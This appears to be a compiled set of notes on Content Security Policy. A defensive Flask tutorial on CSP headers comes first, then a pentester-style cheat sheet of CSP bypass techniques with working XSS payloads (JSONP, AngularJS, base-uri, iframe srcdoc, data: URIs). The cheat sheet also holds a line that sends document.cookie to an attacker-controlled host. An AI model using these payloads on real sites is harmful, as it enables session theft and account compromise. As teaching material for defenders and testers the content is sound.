
##
#
https://safecontrols.blog/2020/04/02/protecting-the-web-with-a-solid-content-security-policy/
#
##

Protecting the web with a solid content security policy
April 2, 2020 Håkon Olsen1 Comment	

We have been used to securing web pages with security headers to fend off cross-site scripting attacks, clickjacking attacks and data theft. Many of these headers are now being deprecated and browser may no longer respect these header settings. Instead, we should be using content security policies to reduce the risk to our web content and its users.
Protect your web resources and your users with Content Security Policy headers!

CSP’s are universally supported, and also allows reporting of policy violations, which can aid in detecting hacking attempts.
Mozilla Developer Network has great documentation on the use of CSP’s: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy.
CSP by example

We want to make it even easier to understand how CSP’s can be used, so we have made some demonstrations for the most common directives we should be using. Let us first start with setting the following header:

Content-Security-Policy: default-src ‘self’;

We have created a simple Flask application to demonstrate this. Here’s the view function:
A simple view function setting a CSP header.

Here we are rendering a template “index.html”, and we have set the default-src directive of the CSP to ‘self’. This is a “fallback” directive in case you do not specify other directives for key resources. Here’s what this does to JavaScript and clickjacking, when other directives are missing:

    Blocks inline JavaScript (that is, anything inside tags, onclick=… on buttons, etc) and JavaScript coming from other domains.
    Blocks media resources from other domains, including images
    Blocks stylesheets from external domains, as well as inline style tags (unless explicitly allowed)

Blocking untrusted scripts: XSS

Of course, you can set the default-src to allow those things, and many sites do, but then the protection provided by the directive will be less secure. A lot of legacy web pages have mixed HTML and Javascript in <script> tags or inline event handlers. Such sites often set default-src: ‘self’ ‘unsafe-inline’; to allow such behaviour, but then it will not help protect against common injection attacks. Consider first the difference between no CSP, and the following CSP:

Content-Security-Policy: default-src: ‘self’;

We have implemented this in a route in our Python web app:
Adding the header will help stop XSS attacks.

Let us first try the following url: /xss/safe/hello: the result is injected into the HTML through the Jinja template. It is using the “safe” filter in the template, so the output is not escaped in any way.
Showing that a URL parameter is reflected on the page. This may be XSS vulnerable (it is).

We see here that the word “hello” is reflected on the page. Trying with a typical cross-site-scripting payload: shows us that this page is vulnerable (which we know since there is no sanitation):
No alert box: the CSP directive blocks it!

We did not get an alert box here, saying “XSS”. The application itself is vulnerable, but the browser stopped the event from happening due to our Content-Security-Policy with the default-src directive set to self, and no script-src directive allowing unsafe inline scripts. Opening the dev tools in Safari shows us a bunch of error messages in the console:
Error messages in the browser console (open dev tools to find this).

The first message shows that the lack of nonce or unsafe-inline blocked execution. This is done by the web browser (Safari).

Further, we see that Safari activates its internal XSS auditor and detects my payload. This is not related to CSP’s, and is internal Safari behavior: it activates its XSS auditor unless there is an X-XSS-Protection header asking to explicitly disable XSS protection. This is Safari-specific and should not be assumed as a default. The X-XSS-Protection header is a security header that has been used in Internet Explorer, Chrome and Safari but it is currently be deprecated. Edge has removed its XSS Auditor, and Firefox has not implemented this header. Use Content Security Policies instead.
What if I need to allow inline scripts?

The correct way to allow inline JavaScript is to include the nonce directive (nonce = number used once) or use a hash of the inline script. These values should then rather be placed in the script-src directive than in the default-src one. For more details on how to do this, see https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#Unsafe_inline_script.

Let’s do an example of an unsafe inline script in our template, using a nonce to allow the inline script. Here’s our code:
Example code showing use of nonce.

    Remember to make the nonce unguessable by using a long random number, and make sure to regenerate it each time the CSP is sent to the client – if not, you are not providing much of security protection.
    Nonces are only good if they can’t be guessed, and that they are truely used only once.

Here we have one script with a nonce included, and one that does not have it included. The nonce’d script will create an alert box, and the script without the nonce tries to set the inner HTML of the paragraph with id “blocked” to “Hello there”. The alert box will be created but the update of the “blocked” paragraph will be blocked by the CSP.

Here’s the HTML template:
A template with two inline scripts. One with an inserted nonce value, one without. Which one will run?

The result is as expected:
Only the nonce’d script will run 🙂

Conclusion: Use CSP’s for protecting against cross-site scripting (XSS) – but keep sanitising as well: defence in depth.
What about clickjacking?

good explanation of clickjacking and how to defend against it is available from Portswigger: https://portswigger.net/web-security/clickjacking.

Here’s a demo of how clickjacking can work using to “hot” domains of today: who.int and zoom.us (the latter is not vulnerable to clickjacking).
Demo of Clickjacking!

Here’s how to stop that from happening. Add the frame-ancestors directive, and whitelist domains you want to be able of iframing your web page.

Content-Security-Policy: default-src: 'self'; frame-ancestors: 'self' 'youtube.com';

Summary

Protecting against common client-side attacks such as XSS and clickjacking can be done using the Content Security Policy header. This should be part of a defense in depth strategy but it is an effective addition to your security controls. As with all controls that can block content, make sure you test thoroughly before you push it to production!

##
##

##
#
https://www.cobalt.io/blog/csp-and-bypasses
https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy
#
##

Content Security Policy (CSP) is a W3C standard that allows developers to control resource loading and execution of certain types of scripts in a web application. It is designed to increase web applications' security and protect users from XSS (Cross-Site Scripting) attacks.

This blog post aims to demonstrate what CSP is and why CSP is implemented. And how attackers can bypass CSP. In this article, I will include how you can bypass some directives to achieve XSS on the target application.

 

What is CSP?
CSP stands for Content Security Policy, which defines what resources can be retrieved and executed by a web page. Another way to understand it is by determining which scripts, images, and iframes can be called or run on a specific page from different online locations. A few exceptions include server origins and script endpoints. HTTP response headers or meta elements are used to implement Content Security Policy.

 

Why is Implementing CSP Essential?
To prevent attacks such as cross-site scripting (XSS), CSP technology is built into most browsers as a built-in technology. Clickjacking can be prevented more efficiently than using X-Frame-Options headers by using proper CSP. Therefore, you should use CSP to protect your website against clickjacking attacks. However, if you want to protect older browsers that do not support CSP, you can combine this with the X-Frame-Options header. 

For example, input validation may protect a website from injection attacks, but attackers may still craft unique payloads to bypass it. As a result, CSP does not represent your first line of defense but your defense in depth.

Even when the validation checks are bypassed, CSP blocks script execution from an unintended source neutralizing the attack to much extent.

 

CSP Directives
When implementing CSP, we must understand different policy directives we can use. Let’s take a look at some of them.

script-src: Specifies the JavaScript sources that are allowed. Additionally, inline script event handlers (onclick) and XSLT stylesheets (eXtensible Stylesheet Language) that trigger script execution can also be loaded into elements.

default-src: This directive specifies how resources are fetched by default. The browser follows this directive if fetch directives are not included in the CSP header.

child-src: This directive specifies what resources web workers and embedded frames can use.

frame-src: This directive limits the URLs that can be called out as frames.

frame-ancestors: A directive specifies the sources where this page can be embedded. It applies only to non-HTML resources and can't be used in tags(used to prevent clickjacking attacks).

img-src: This specifies which sources can be used to load images on the web page.

object-src: This property defines the allowed sources for the elements object, embed, and widget.

base-uri: With this element, you can define the allowed URLs for an element to load using.

upgrade-insecure-requests: By using this directive, browsers are instructed to rewrite URL schemes so that HTTP is replaced by HTTPS. Rewriting old URLs can be beneficial for websites with many old URLs.

sandbox: The sandbox (document) directive creates a sandbox around the resource, similar to the sandbox attribute. As a result, popups are prevented, plugins and scripts are prohibited, and a same-origin policy is enforced.

Some other CSP directives include: prefetch-src, connect-src, form-action, etc.

 

Values for CSP Directives 
*: Except for data: blob: filesystem schemes, any URL can be used.
none: No sources are allowed to be loaded in this case.
self: A source that defines that resources from the same domain are permitted to be loaded.
data: Load resources using the data scheme (e.g. Base64 encoded images)
unsafe-eval: This allows you to create code from strings using eval() and window.execScript. This source should not be included in any directives. That's why it's called unsafe.
unsafe-hashes: Use this to enable specific event handlers inline.
unsafe-inline: This allows using inline resources, such as inline elements, javascript: URLs, and inline event handlers. For security reasons, this is not recommended.
nonce: An inline script whitelist that uses a cryptographic nonce (number used once). A nonce value must be unique and generated each time the server transmits a policy.
sha256-<hash>: The script has to have a specific SHA256 hash to be whitelisted.
To validate the CSP of your application, check out CSP Evaluator by Google.



Unsafe Policies
 
Wildcard(*)
CSP Header

Content-Security-Policy: script-src 'self' https://cobalt.io https: data *; 

In script-src, a wildcard is used, which results in a misconfigured CSP policy.

XSS payloads:

<script src="data:text/javascript,alert(document.domain)"></script>

<script src=https://cobalt.io/evil.js></script>

 

Unsafe eval()
CSP Header

Content-Security-Policy: script-src https://cobalt.io 'unsafe-eval' data: http://*;

This policy remains vulnerable due to unsafe-eval usage despite having the script source set to https://www.cobalt.io.

XSS payloads:

<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>

 

Unsafe inline
CSP Header

Content-Security-Policy: script-src ‘self’  'unsafe-inline' ;

Despite this policy requiring scripts from the Cobalt.io site, it is vulnerable because the directive uses unsafe-inline.

XSS payloads:

<script>alert(domain);</script>

<Svg OnLoad=alert(domain)>

Example:

Notice that a normal <tag eventhandler=js> will work if unsafe-inline is implemented.

Here we can see the above CSP header is implemented.



Using the payload mentioned above, we can achieve XSS vulnerability.



JSONP Callback and Whitelisted the Third Party
In JSONP, the same-origin policy (SOP) is bypassed so you can request and retrieve data from a server without worrying about cross-domain issues.

JavaScript payloads can be injected into JSONP endpoints through GET parameters called "callbacks", and the endpoint will return them to you as JSON, bypassing SOP(same origin policy). For example, we can send our JavaScript payload via the JSONP endpoint. Below is an example:

https://accounts.google.com/o/oauth2/revoke?callback=alert(1)



The script-src policy can cause problems if a header has one of these endpoints whitelisted. The JSONP endpoint would allow us to bypass the CSP policy by loading our malicious JavaScript.
There are a number of ready-to-use CSP bypass endpoints available in JSONBee.

CSP header

script-src https://www.google.com https://accounts.google.com;

The following payload would be loaded because accounts.google.com allows JavaScript files to be loaded. To load our malicious JavaScript, we are abusing the JSONP feature.

XSS payloads:

cobalt.io?vuln_param=https://accounts.google.com/o/oauth2/revoke?callback=alert(1)

 

Lack of object-src and default-src
CSP header

Content-Security-Policy: script-src 'self' ;

<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>

 

">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'><param name="AllowScriptAccess" value="always"></object>

 

Angular JS
The CSP policy can be bypassed if the AngularJS application loads any scripts from a whitelisted domain. To accomplish this, a callback function and vulnerable class must be called. In addition, a special $event object is defined for AngularJS events, which simply refers to the browser event object. Through this object, you can bypass the CSP.

CSP header

Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;

XSS payloads:

ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

"><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>

 

File Upload
You can bypass the CSP if you can upload a JS file. There is a high probability that the server validates the uploaded file and allows only the specified file types to be uploaded.

In addition, even if you upload JS code into a file with an extension accepted by the server (e.g. script.png if png extension is allowed), this won't suffice because some servers, like the apache server, determine the MIME type of the file based on its extension. Chrome browser, for example, rejects Javascript code running in an image.

CSP header

Content-Security-Policy: script-src 'self';  object-src 'none' ;

XSS payloads:

‘“><script src="/uploads/csp.js"></script>

 

Whitelisted Scheme
CSP header

Content-Security-Policy: script-src data: ;

XSS payloads:

<script%20src=data:text/javascript,alert(1337)></script>

Here we can notice the above CSP header is implemented.



After submitting the above payload, we can achieve XSS, bypassing the CSP.



base-uri Bypass
A dangling markup injection can be performed if the base-uri directive is absent in the defined CSP. You can abuse the base tag to obtain an XSS by making the page load a script from your server if the script has a relative path (like /js/app.js). An HTTPS URL should be used if the vulnerable page is loaded over HTTPS.

CSP header

Content-Security-Policy: script-src 'nonce-abcd1234';

XSS payloads:

<Base Href=//X55.is>

We can notice that a CSP header is implemented like we discussed above.



After submitting the above payload, we get the xss,



Folder path bypass
When you use the %2f to encode '/' as part of your CSP policy and point it to a folder, it will still be considered part of the folder. That seems to be the case with almost all modern-day browsers.

When the server decodes it, it can be bypassed by using "%2f..%2f",  bypassing the folder restriction. For example, you can access http://example.com/company/, and executing http://example.com/company%2f..%2fattacker/file.js will bypass the restriction.

CSP header: 

Content-Security-Policy: script-src cobalt.io/safe-directory/

XSS payloads:

<script src="https://<abc>.com/safe-directory%2f..%2f/abc/unsafe-directory"></script> 

Bypassing CSP using IFRAME
Attackers can use Iframes to bypass the below CSP policy. An iframe from the whitelisted domain must be allowed by the application in order to perform the bypass. An XSS attack can be easily facilitated by using the srcdoc attribute of the iframe.

CSP header

Content-Security-Policy: default-src 'self' data: *; connect-src 'self'; script-src  'self' ; 

XSS payloads:

<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>

<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>

CSP Injection Bypass
In this case, the input from the user is reflected back in the CSP header. Let's take the following URL as an example:

https://www.cobalt.io?param=payload.

This is what you should see if your input is reflected in the CSP header.

CSP header

script-src payload;

object-src 'none';

base-uri 'none';

script-src can therefore be set to whatever value we want. This value can be easily set to a domain we control, bypassing the CSP.

CSP Data Exfiltration
Even though there’s a strict CSP that prohibits you from interacting with external servers, there are still things you can do to exfiltrate the data regardless of how strict the CSP is.

Location 

In order to send the secret information to the attacker's server, you could simply update the location:

var sessionid = document.cookie.split('=')[1] + "."; 

document.location = "https://www.attacker-owned-website.com/?" + sessionid;

Conclusion
CSP serves as a defense-in-depth strategy against XSS and clickjacking attacks. CSP can, however, be easily bypassed if not implemented properly. Therefore, it is ideal for all scripts to reside on your hosts, and your CSP should not allow anything from the internet.

We hope you enjoyed this blog post. See you again in our next blog post.

Reference
https://brutelogic.com.br/blog/csp-bypass-guidelines/
https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d
https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass

##
##

##
##
##

<3

https://developers.google.com/web/fundamentals/security/csp
<br>
<br>
Spring_v_XSS
<br>
https://www.baeldung.com/spring-prevent-xss
<br>
https://www.stackhawk.com/blog/spring-content-security-policy-guide-what-it-is-and-how-to-enable-it/
<br>
https://phani-susarla.medium.com/preventing-xss-in-spring-boot-apps-558580340f33

<br>
https://stackoverflow.com/questions/30280370/how-does-content-security-policy-csp-work
<br>
Bypasses
<br>
https://blog.detectify.com/2019/07/11/content-security-policy-csp-explained-including-common-bypasses/
<br>

CONTENT-SECURITY-POLICY NONCE WITH SPRING SECURITY
<br>
https://techblog.bozho.net/content-security-policy-nonce-with-spring-security/
<br>

https://github.com/nico3333fr/CSP-useful
<br>

https://github.com/paragonie/csp-builder


<br>
Adding CSP Header
https://github.com/apache/zeppelin/pull/3141/files
<br>

GitHub Case Study
https://github.blog/2016-04-12-githubs-csp-journey/


